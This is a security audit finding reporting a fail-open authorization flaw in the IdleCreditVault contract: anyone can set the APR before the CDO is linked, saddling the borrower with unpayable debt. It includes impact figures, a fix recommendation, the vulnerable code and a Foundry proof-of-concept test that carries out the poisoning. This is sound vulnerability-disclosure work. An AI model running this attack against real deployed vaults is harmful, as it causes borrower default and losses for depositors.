### Title
Unauthenticated APR poisoning before CDO linking can create unpayable borrower debt - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr` intentionally skips authorization while `idleCDO` is unset so factory setup can configure the rate before linking the CDO. [1](#0-0)  Because the fallback is fail-open, any EOA can call `setAprs` during that window and permanently poison both `unscaledApr` and `lastApr` before the honest owner executes `setWhitelistedCDO`. [2](#0-1) 

### Finding Description
`initialize` does not bind a CDO and sets the default APR cap to `20e18`. [3](#0-2)  While `idleCDO == address(0)`, `setApr` does not authenticate `msg.sender` at all. [1](#0-0)  `setAprs` compounds this by writing attacker-controlled `unscaledApr` before invoking the unauthenticated `setApr` path. [4](#0-3) 

Once the owner links the real CDO, the same function correctly restricts updates to the CDO or manager. [5](#0-4)  The CDO consumes `lastApr` as the strategy APR when calculating epoch interest. [6](#0-5)  At the default cap of `20e18`, a 35-day epoch creates approximately `1.9178 × TVL` of expected interest, requiring repayment of approximately `2.9178 × TVL`.

### Impact Explanation
An attacker can deposit after the CDO is linked and benefit from the poisoned borrower obligation if the borrower repays, or force borrower default and protocol insolvency when the obligation exceeds available repayment capacity. [7](#0-6)  For a 1,000,000 USDC vault and a 35-day epoch, the maximum configured rate produces approximately 1,917,808 USDC of epoch interest instead of the intended amount.

This is a direct fail-open authorization analog: the missing security configuration—the whitelisted CDO—removes authentication rather than rejecting writes. [5](#0-4)  Existing `maxApr` validation does not prevent the attack because initialization deliberately permits rates up to `20e18`. [8](#0-7) 

### Likelihood Explanation
Factory deployment is atomic and calls `setAprs` immediately before `setWhitelistedCDO`, so factory-created vaults do not expose a transaction gap. [9](#0-8)  The issue affects manually deployed or upgraded strategies where initialization and CDO linking are separate transactions. [10](#0-9)  The attacker only needs to observe the initialized strategy and submit one public transaction before the honest linking transaction.

### Recommendation
Fail closed whenever `idleCDO` is unset by removing the `address(0)` authorization bypass from `setApr`. [1](#0-0)  If setup-time configuration is required, permit only the current `owner()` or `manager`, and reject zero-address manager initialization. [11](#0-10)  `setAprs` should also validate authorization before updating `unscaledApr`. [4](#0-3)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IdleCreditVault, NotAllowed} from
    "../contracts/strategies/idle/IdleCreditVault.sol";

contract MockUnderlying is ERC20 {
    constructor() ERC20("Mock USDC", "mUSDC") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }
}

contract SetAprFailOpenPoC is Test {
    IdleCreditVault internal strategy;
    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal borrower = makeAddr("borrower");
    address internal attacker = makeAddr("attacker");
    address internal cdo = makeAddr("cdo");
    address internal proxyAdmin = makeAddr("proxyAdmin");

    function setUp() public {
        vm.createSelectFork("mainnet");

        MockUnderlying underlying = new MockUnderlying();
        IdleCreditVault implementation = new IdleCreditVault();

        strategy = IdleCreditVault(
            address(
                new TransparentUpgradeableProxy(
                    address(implementation),
                    proxyAdmin,
                    abi.encodeWithSelector(
                        IdleCreditVault.initialize.selector,
                        address(underlying),
                        owner,
                        manager,
                        borrower,
                        "Borrower",
                        1e17 // intended 10% APR
                    )
                )
            )
        );
    }

    function testUnauthorizedPreLinkAprPoisoning() public {
        assertEq(strategy.idleCDO(), address(0));
        assertEq(strategy.getApr(), 1e17);

        // An unprivileged EOA sets both APR fields to the maximum allowed value.
        vm.prank(attacker);
        strategy.setAprs(20e18, 20e18);

        assertEq(strategy.unscaledApr(), 20e18);
        assertEq(strategy.getApr(), 20e18);

        // The honest owner later completes deployment and locks in the poisoned rate.
        vm.prank(owner);
        strategy.setWhitelistedCDO(cdo);

        // The attacker can no longer repair or further alter the rate.
        vm.prank(attacker);
        vm.expectRevert(NotAllowed.selector);
        strategy.setApr(0);

        // For a 1,000,000 USDC vault and a 30-day epoch plus 5-day buffer:
        // interest = TVL * 20 * 35 / 365.
        uint256 tvl = 1_000_000e6;
        uint256 epochInterest = tvl * 20e18 * 35 days / (1e18 * 365 days);

        assertEq(epochInterest, 1_917_808_219_178); // ~191.78% of TVL
        assertEq(tvl + epochInterest, 2_917_808_219_178);
    }
}
```

  /// @notice set both the scaled and unscaled apr
  /// @dev only cdo and manager can set the apr.
  /// @param _unscaledApr unscaled apr
  /// @param _apr scaled apr
  function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    unscaledApr = _unscaledApr;
    // here we also check that msg.sender is allowed
    setApr(_apr);
  }

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }

  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
